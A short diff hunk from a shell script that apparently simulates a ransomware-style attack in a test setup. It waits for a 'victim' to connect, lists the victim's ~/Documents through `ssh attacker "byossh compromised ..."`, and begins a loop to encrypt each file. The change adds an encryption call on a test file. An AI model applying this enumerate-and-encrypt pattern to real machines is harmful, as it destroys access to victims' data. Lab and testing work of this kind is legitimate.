@@ -27,6 +27,8 @@ victimPid=$!
 
 sleep 5 # let the victim connect
 
+encrypt_file "$HOME/testing.txt"
+
 # Encrypt documents
 output=$(ssh attacker "byossh compromised find ~/Documents" | sed '1d')
 while IFS= read -r file; do
